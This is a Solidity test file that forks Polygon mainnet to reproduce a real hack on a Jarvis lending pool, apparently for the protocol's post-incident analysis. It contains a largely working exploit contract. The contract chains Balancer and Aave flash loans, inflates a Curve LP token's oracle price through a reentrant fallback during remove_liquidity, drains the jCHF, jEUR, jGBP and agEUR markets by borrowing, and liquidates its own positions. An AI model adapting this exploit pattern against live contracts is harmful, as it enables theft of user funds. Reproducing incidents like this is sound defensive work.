// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import { CurveLpTokenPriceOracleNoRegistry } from "../oracles/default/CurveLpTokenPriceOracleNoRegistry.sol";
import "../external/curve/ICurvePool.sol";
import "../external/compound/ICErc20.sol";
import "../external/compound/IComptroller.sol";

import { WETH } from "solmate/tokens/WETH.sol";
import "openzeppelin-contracts-upgradeable/contracts/token/ERC20/IERC20Upgradeable.sol";

import { BaseTest, Utils } from "./config/BaseTest.t.sol";

contract ReproduceHackTest is BaseTest {

  function testReproduce() public fork(POLYGON_MAINNET) {
    vm.rollFork(hex"0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f");

    TakeFLAndExploit exploit = new TakeFLAndExploit();

    exploit.execute(32, 24, 34123638261128675748637996922082035725421397473114561325563837855021150502912);
  }

  function testReplicate() public fork(POLYGON_MAINNET) {
    vm.rollFork(hex"0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f");
    address hacker = 0x1863b74778cf5e1C9C482a1cDc2351362bD08611;
    address flContract = 0x757E9F49aCfAB73C25b20D168603d54a66C723A1;

    vm.prank(hacker);
    _functionCall(flContract, hex"bbc1ef7a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184b714b7938593341596e37417a65473772375656785137340000000000000000", "callerrrrr");
  }

  function _functionCall(
    address target,
    bytes memory data,
    string memory errorMessage
  ) internal returns (bytes memory) {
    (bool success, bytes memory returndata) = target.call(data);

    if (!success) {
      if (returndata.length > 0) {
        assembly {
          let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size)
        }
      } else {
        revert(errorMessage);
      }
    }

    return returndata;
  }
}

interface IBalancer {
  function flashLoan(address receiver, address[] calldata tokens, uint256[] calldata amounts, bytes calldata data) external;
}

interface IAaveV3FlashLoanReceiver {
  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool);
}

contract TakeFLAndExploit is Utils, IAaveV3FlashLoanReceiver {
  WETH wmatic = WETH(payable(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270));
  address lpTokenMarketAddress = 0x23F43c1002EEB2b146F286105a9a2FC75Bf770A4;

  function execute(uint256 a, uint256 b, uint256 c) public {
    ICErc20 market = ICErc20(lpTokenMarketAddress);
    address underlying = market.underlying(); // stMatic-wMatic LP token
    IBalancer balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 maxFLBalancer = wmatic.balanceOf(address(balancer));

    balancer.flashLoan(address(this), asArray(address(wmatic)), asArray(maxFLBalancer), "");
    // balancer will call receiveFlashLoan()
  }

  function receiveFlashLoan(address[] calldata tokens, uint256[] calldata amounts, uint256[] calldata x, bytes calldata data) public {
    address aaveV3WMatic = 0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97;
    uint256 maxFLAaveV3 = wmatic.balanceOf(aaveV3WMatic);

    IAaveV3Market aaveV3WMaticMarket = IAaveV3Market(aaveV3WMatic);

    aaveV3WMaticMarket.flashLoan(
      address(this),
      asArray(address(wmatic)),
      asArray(maxFLAaveV3),
      asArray(0),
      address(this),
      hex"3078",
      0
    );
    // aave will call executeOperation()


    // return balancer FL and fees
  }

  // implementation serves both aave v2 and v3 calls
  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
  ) external returns (bool) {
    address aaveV2WMatic = 0x8dF3aad3a84da6b69A4DA8aeC3eA40d9091B2Ac4;
    if (msg.sender != aaveV2WMatic) {
      uint256 maxFLAaveV2 = wmatic.balanceOf(aaveV2WMatic);

      IAaveV2Market aaveV2WMaticMarket = IAaveV2Market(aaveV2WMatic);

      aaveV2WMaticMarket.flashLoan(
        address(this),
        asArray(address(wmatic)),
        asArray(maxFLAaveV2),
        asArray(0),
        address(this),
        hex"3078",
        0
      );
    } else {
      executeHackAfterFLs();
    }

    // return aave v3 FL and fees

    return true;
  }

  address mpoAddress = 0xb9e1c2B011f252B9931BBA7fcee418b95b6Bdc31;
  address jarvisPoolAddress = 0xD265ff7e5487E9DD556a4BB900ccA6D087Eb3AD2;

  address jCHFMarketAddress = 0x62Bdc203403e7d44b75f357df0897f2e71F607F3;
  address jEURMarketAddress = 0xe150e792e0a18C9984a0630f051a607dEe3c265d;
  address jGBPMarketAddress = 0x7ADf374Fa8b636420D41356b1f714F18228e7ae2;
  address agEurMarketAddress = 0x5aa0197D0d3E05c4aA070dfA2f54Cd67A447173A;

  function executeHackAfterFLs() internal {
    IComptroller pool = IComptroller(jarvisPoolAddress);

    pool.enterMarkets(
      asArray(
        lpTokenMarketAddress,
        jCHFMarketAddress,
        jEURMarketAddress,
        jGBPMarketAddress,
        agEurMarketAddress
      )
    );

    address curveMaticPoolAddress = 0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28;
    ICurvePool curveMaticPool = ICurvePool(curveMaticPoolAddress);

    uint256 addLiquidityAmount = 270000e18;
    uint256 fstMaticMintedExpected = 126900000000000000000000;
    wmatic.approve(curveMaticPoolAddress, addLiquidityAmount);

    uint256 fstMaticMinted = curveMaticPool.add_liquidity(
      asArray2(0, addLiquidityAmount),
      fstMaticMintedExpected,
      false // use_eth
    );

    address stMaticAddress = 0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d;
    IERC20Upgradeable stMatic = IERC20Upgradeable(stMaticAddress);
    stMatic.approve(lpTokenMarketAddress, fstMaticMinted);

    ICErc20 lpTokenMarket = ICErc20(lpTokenMarketAddress);

    lpTokenMarket.mint(fstMaticMinted);

    IPriceOracle mpo = IPriceOracle(mpoAddress);
    uint256 priceBefore = mpo.getUnderlyingPrice(lpTokenMarket);

    uint256 ownWMaticBalanceBefore = wmatic.balanceOf(address(this));
    uint256 ownStMaticBalanceBefore = stMatic.balanceOf(address(this));
    uint256 minLPTokensMintedExpected = 20836338388555014630579041;

    wmatic.approve(curveMaticPoolAddress, ownWMaticBalanceBefore);

    uint256 lpTokensMinted = curveMaticPool.add_liquidity(
      asArray2(0, ownWMaticBalanceBefore),
      minLPTokensMintedExpected,
      false // use_eth
    );

    // calls fallback internally
    curveMaticPool.remove_liquidity(
      lpTokensMinted,
      asArray(0, 0),
      true // use_eth
    );

    // after fallback execution
    LiquidateOwnPositions liquidator = new LiquidateOwnPositions();
    liquidator.callLiquidations(
      asArray(
        jCHFMarketAddress,
        jEURMarketAddress,
        jGBPMarketAddress,
        agEurMarketAddress
      ),
      address(this), // borrower
      asArray(
        22214068291997556144357,
        57442500000000000000000,
        4750000000000000000000,
        4769452686674485072297
      ),
      lpTokenMarket,
      "",
      ""
    );

    liquidator.sweepToken(stMatic, address(this));

    uint256 stMaticBalanceAfter = stMatic.balanceOf(address(this));

    curveMaticPool.remove_liquidity_one_coin(
      stMaticBalanceAfter, 1, 0, false
    );

    // call kyber, uniswap, curve swaps
    // jchf - kyber
    // jeur - kyber
    // jgbp - kyber
    // ageur - uni v3
    // usdc - uni v3


    // add stmatic liquidity to curveMaticPool
    // then remove_liquidity_one_coin to wmatic

    // return aave v2 FL and fees
  }

  receive() external payable {}

  address jCHFAddress = 0xbD1463F02f61676d53fd183C2B19282BFF93D099;
  address jEURAddress = 0x4e3Decbb3645551B8A19f0eA1678079FCB33fB4c;
  address jGBPAddress = 0x767058F11800FBA6A682E73A6e79ec5eB74Fac8c;
  address agEURAddress = 0xE0B52e49357Fd4DAf2c15e02058DCE6BC0057db4;

  // receive from remove_liquidity
  fallback() external payable {
    ICErc20 lpTokenMarket = ICErc20(lpTokenMarketAddress);
    IPriceOracle mpo = IPriceOracle(mpoAddress);

    // should be 10x than before
    uint256 priceAfter = mpo.getUnderlyingPrice(lpTokenMarket);

    {
      IERC20Upgradeable jchf = IERC20Upgradeable(jCHFAddress);
      uint256 jchfBalance = jchf.balanceOf(jCHFMarketAddress);
      ICErc20 jCHFMarket = ICErc20(jCHFMarketAddress);
      jCHFMarket.borrow(jchfBalance);
    }

    {
      IERC20Upgradeable jeur = IERC20Upgradeable(jEURAddress);
      uint256 jeurBalance = jeur.balanceOf(jEURMarketAddress);
      ICErc20 jEURMarket = ICErc20(jEURMarketAddress);
      jEURMarket.borrow(jeurBalance);
    }

    {
      IERC20Upgradeable jgbp = IERC20Upgradeable(jGBPAddress);
      uint256 jgbpBalance = jgbp.balanceOf(jGBPMarketAddress);
      ICErc20 jGBPMarket = ICErc20(jGBPMarketAddress);
      jGBPMarket.borrow(jgbpBalance);
    }

    {
      IERC20Upgradeable agEur = IERC20Upgradeable(agEURAddress);
      uint256 agEurBalance = agEur.balanceOf(agEurMarketAddress);
      ICErc20 jGBPMarket = ICErc20(agEurMarketAddress);
      jGBPMarket.borrow(agEurBalance);
    }
  }
}

contract LiquidateOwnPositions is Utils {
  constructor () {}

  function callLiquidations(
    address[] calldata markets,
    address borrower,
    uint256[] calldata amounts,
    ICToken collateralMarket,
    bytes calldata unknown1,
    bytes calldata unknown2
  ) public {
    for (uint8 i = 0; i < markets.length; i++) {
      ICErc20 market = ICErc20(markets[i]);
      IERC20Upgradeable underlying = IERC20Upgradeable(market.underlying());
      underlying.approve(markets[i], amounts[i]);

      market.liquidateBorrow(borrower, amounts[i], collateralMarket);
    }

    uint256 totalCTokensSeized = collateralMarket.balanceOf(address(this));
    collateralMarket.redeem(totalCTokensSeized);
  }

  function sweepToken(IERC20Upgradeable stMatic, address receiver) public {
    stMatic.transfer(receiver, stMatic.balanceOf(address(this)));
  }
}

interface IAaveV2Market {
  function flashLoan(address receiver,
    address[] calldata tokens,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode) external;
}

interface IAaveV3Market {
  function flashLoan(address receiver,
    address[] calldata tokens,
    uint256[] calldata amounts,
    uint256[] calldata modes,
    address onBehalfOf,
    bytes calldata params,
    uint16 referralCode) external;
}
